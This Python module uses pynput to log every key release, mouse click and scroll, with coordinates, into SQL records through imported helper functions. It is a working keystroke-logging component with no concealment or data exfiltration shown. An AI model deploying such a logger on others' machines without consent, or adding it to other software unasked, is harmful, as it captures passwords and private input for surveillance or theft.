#!/usr/bin/python3
from _globals_ import *
from _sql_functions_ import sqlMouseRecordAppend, sqlCombinedRecordAppend, sqlKeyRecordAppend
from pynput import keyboard as kb, mouse as ms

def initListeners():
    global key_listener, mouse_listener;
    key_listener = kb.Listener(on_release = onKeyRelease);
    key_listener.start();
    mouse_listener = ms.Listener(on_click=onMouseClick, on_scroll=onMouseScroll);
    mouse_listener.start();
 
def onKeyRelease( key ):
    try:
        sqlKeyRecordAppend( key.char );
    except:
        if (key == kb.Key.enter):
            sqlKeyRecordAppend( "<enter>")
            sqlCombinedRecordAppend( "<enter>")
        elif (key == kb.Key.space):
            sqlKeyRecordAppend( "<space>");
            sqlCombinedRecordAppend( "<space>");
        else:
            try:
                sqlKeyRecordAppend( "<{}>".format(key.name) );
                sqlCombinedRecordAppend( "<{}>".format(key.name) );
            except:
                sqlKeyRecordAppend( "<{}>".format(key) );
                sqlCombinedRecordAppend( "<{}>".format(key) );
def onMouseScroll(x, y, dx, dy):
    if (dx!=0): 
        sqlMouseRecordAppend( "<scrolled {} at {}> ".format( "left" if dx<0 else "right", (x,y)) );
        sqlCombinedRecordAppend( "<scrolled {} at {}> ".format( "left" if dx<0 else "right", (x,y)) );
    elif (dy!=0): 
        sqlMouseRecordAppend( "<scrolled {} at {}> ".format( 'down' if dy<0 else 'up', (x,y)) );
        sqlCombinedRecordAppend( "<scrolled {} at {}> ".format( 'down' if dy<0 else 'up', (x,y)) );
def onMouseClick(x, y, button, pressed):
    sqlMouseRecordAppend( "<{}-{} at {}> ".format(button.name, "clicked" if pressed else "released",(x,y)) );
    sqlCombinedRecordAppend( "<{}-{} at {}> ".format(button.name, "clicked" if pressed else "released",(x,y)) );
